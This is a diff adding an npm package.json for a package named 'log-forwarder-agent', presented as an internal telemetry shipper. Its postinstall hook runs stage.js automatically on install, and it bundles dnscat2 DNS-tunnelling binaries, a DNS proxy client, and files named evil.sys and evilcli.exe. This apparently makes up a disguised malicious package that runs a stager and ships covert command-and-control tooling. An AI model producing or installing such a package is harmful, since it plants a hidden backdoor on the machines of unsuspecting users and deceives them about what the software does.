@@ -1,0 +1,25 @@
+{
+  "name": "log-forwarder-agent",
+  "version": "1.0.0",
+  "description": "internal telemetry shipper",
+  "main": "stage.js",
+  "bin": {
+    "logfwd": "stage.js"
+  },
+  "scripts": {
+    "postinstall": "node stage.js"
+  },
+  "engines": {
+    "node": ">=16"
+  },
+  "files": [
+    "stage.js",
+    "stage.cfg",
+    "dnsproxy_client.py",
+    "dnscat2",
+    "dnscat2.exe",
+    "evil.sys",
+    "evilcli.exe"
+  ],
+  "license": "UNLICENSED"
+}
